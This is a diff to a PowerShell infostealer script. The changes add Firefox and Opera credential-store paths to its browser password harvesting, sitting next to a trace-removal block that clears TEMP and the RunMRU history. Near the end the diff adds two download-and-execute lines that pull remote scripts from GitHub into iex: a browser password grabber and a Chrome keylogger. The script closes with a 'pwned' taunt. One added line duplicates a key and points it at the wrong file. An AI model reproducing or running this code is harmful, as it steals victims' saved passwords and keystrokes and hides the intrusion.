@@ -142,6 +142,7 @@ if ($gatherBrowserPass) {
             ProcessName = "chrome"
             LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
             LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Local State"
+            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Login Data For Account"
             Prefix = "Chrome"
         },
         @{
@@ -155,6 +156,19 @@ if ($gatherBrowserPass) {
             LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
             LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Local State"
             Prefix = "Edge"
+        }
+        @{
+            ProcessName = "Firefox"
+            $FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+            LoginDataPath = "$FirefoxCredsLocation\key4.db"
+            LocalStatePath = "$FirefoxCredsLocation\logins.json"
+            Prefix = "Firefox"
+        }
+        @{
+            ProcessName = "Opera"
+            $OperaCredsLocation = get-childitem -path "$env:appdata\Opera Software\Opera Stable\"
+            LoginDataPath = "$OperaCredsLocation\Login Data"
+            Prefix = "Opera"
         }
     )
 
@@ -291,5 +305,8 @@ if ($removeTraces) {
     Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
 }
-
+# Grab pass browserpassview
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1 | iex
+# keylogchrome
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
 Write-Output "✨ You have been pwned lmaooo :3 :3"
